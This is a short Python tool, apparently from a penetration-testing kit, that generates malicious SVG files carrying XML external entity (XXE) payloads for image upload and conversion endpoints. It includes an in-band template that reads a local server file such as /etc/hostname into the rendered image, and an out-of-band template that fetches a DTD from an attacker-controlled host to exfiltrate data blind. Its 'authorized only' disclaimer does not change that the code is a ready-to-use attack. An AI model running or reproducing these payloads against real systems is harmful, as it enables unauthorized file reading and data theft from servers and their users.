#!/usr/bin/env python3
"""
make_svg_xxe.py — build an XXE SVG for image/avatar/logo uploads (and SVG->PNG converters).

SVG is XML, so a DOCTYPE with an external entity fires when the server parses/rasterizes it. In-band mode embeds the
file in a <text> node (read it back from the rendered/converted image or its text); OOB mode exfiltrates blind via your
DTD host.

Discipline: benign file / OOB first; upload with your own account; DELETE the uploaded file after. Authorized only.

Usage:
  python3 make_svg_xxe.py -o evil.svg --file file:///etc/hostname          # in-band (view the rendered SVG/PNG)
  python3 make_svg_xxe.py -o evil.svg --oob YOUR-HOST:8000                  # blind OOB
"""
import argparse, sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # never crash a cp1252 console
except Exception:
    pass

INBAND = ('<?xml version="1.0" standalone="yes"?>\n'
          '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "{fileuri}"> ]>\n'
          '<svg xmlns="http://www.w3.org/2000/svg" width="320" height="80">\n'
          '  <text x="10" y="40" font-size="14">&xxe;</text>\n'
          '</svg>\n')

OOB = ('<?xml version="1.0"?>\n'
       '<!DOCTYPE svg [ <!ENTITY % ext SYSTEM "http://{oob}/evil.dtd"> %ext; ]>\n'
       '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40">\n'
       '  <text x="10" y="20">x</text>\n'
       '</svg>\n')


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-o", "--out", default="evil.svg")
    ap.add_argument("--file", default="file:///etc/hostname", help="in-band file URI (default benign)")
    ap.add_argument("--oob", help="oob_server host:port -> blind-OOB SVG")
    a = ap.parse_args()

    svg = OOB.format(oob=a.oob) if a.oob else INBAND.format(fileuri=a.file)
    with open(a.out, "w", encoding="utf-8") as f:
        f.write(svg)
    mode = f"blind-OOB via {a.oob}" if a.oob else f"in-band read of {a.file}"
    print(f"[+] wrote {a.out}  ({mode})")
    print("    Upload as an avatar/logo/image. In-band: view the rendered/converted image or its text for the file.")
    print("    OOB: watch oob_server.py. DELETE the uploaded file after (§19). Authorized only.")


if __name__ == "__main__":
    main()
